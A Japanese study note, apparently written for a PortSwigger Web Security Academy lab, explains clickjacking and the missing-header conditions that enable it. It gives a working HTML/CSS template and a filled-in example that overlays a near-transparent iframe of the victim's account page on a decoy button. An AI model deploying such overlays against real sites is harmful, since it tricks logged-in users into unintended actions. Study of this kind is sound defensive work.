## 脆弱性の説明
- 攻撃者が自分自身で作ったwebサイトにユーザを誘導し、透明化してある正規のサイトの下に攻撃者が作ったボタンを配置する。そうすることで、ユーザはそのボタンを押すが、透明化してある正規のサイトのボタンが押されることによって、ユーザが意図しないリクエストを行ってしまう。

## 攻撃の条件
- 攻撃者が実行させようと使用している処理にログイン後のセッションIDや、CSRFトークンが必要な場合はユーザが事前にそれらの値を持っていることが前提となる。
- サーバ側の実装で別ドメインからの繊維が可能であること。具体的には以下のレスポンスヘッダーが実装されてない場合、悪用できる可能性がある。
```markdown
1. レスポンスヘッダにX-Frame-Optionsヘッダが存在すること

2. レスポンスヘッダまたはレスポンスボディにContent-Security-Policyヘッダ相当の要素が存在すること
```

## 手順 ※一度削除すると20分で何もできなくなるので改めて記載する。
1. 被害者操作:ログインをする。
![[Pasted image 20251002234913.png]]
2. 罠サイトの構築
```html
<style>
    iframe { /** ←これが実際のページ **/
        position:relative;
        width:$width_value; /** 横幅を設定 **/
        height: $height_value; /** 立幅を設定 **/
        opacity: $opacity; /** 明度の設定。ページ作成時は0.1で実際に公開するときは0.0001にする。 **/
        z-index: 2;
    }
    div { /** ←自作するボタン(最背面に設置を行う) **/
        position:absolute;
        top:$top_value; /** ←高さ調整 **/
        left:$side_value;/** ←横幅調整 **/
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"> /** ターゲットのサイト **/
</iframe>
```
- ↓実際の記入例
```html
<style>
    iframe {
        position:relative;
        width:700px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:300px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="https://0ada00ed03368e89800b0395003e008a.web-security-academy.net/my-account"></iframe>
```

3. 調整時の実際の画面は以下の様になる。
![[Pasted image 20251003174022.png]]
![[Pasted image 20251003174125.png]]

---
## 事前入力されたフォーム入力による

